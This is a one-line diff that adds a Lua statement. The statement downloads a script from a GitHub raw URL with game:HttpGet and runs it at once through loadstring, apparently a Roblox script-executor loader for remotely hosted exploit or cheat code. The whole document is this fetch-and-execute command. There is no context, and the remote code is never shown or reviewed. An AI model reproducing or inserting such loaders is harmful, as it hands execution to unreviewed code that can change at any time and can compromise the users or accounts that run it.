@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuttle-r/crap/main/Main.txt",true))()
